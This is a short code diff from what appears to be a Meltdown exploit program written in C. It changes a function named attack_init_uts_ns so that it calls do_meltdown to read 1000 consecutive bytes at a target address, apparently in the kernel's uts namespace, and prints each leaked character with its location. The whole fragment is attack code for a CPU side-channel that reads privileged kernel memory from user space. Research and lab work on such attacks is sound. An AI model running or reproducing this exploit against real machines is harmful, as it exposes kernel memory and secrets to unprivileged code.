@@ -174,7 +174,10 @@ static void attack_init_uts_ns(){
     for (int i=0;i<100;i++){
         printf("getting char %c at location %p\n", do_meltdown(target_adrs+2*i), target_adrs+2*i);
     }
-    
+    struct old_utsname *uts_ptr = target_adrs;
+    for (int i=0;i<1000;i++){
+        printf("getting char %c at location %p\n", do_meltdown(target_adrs+i), target_adrs+i);
+    }
 }
 
 #ifdef MELTDOWNCASE
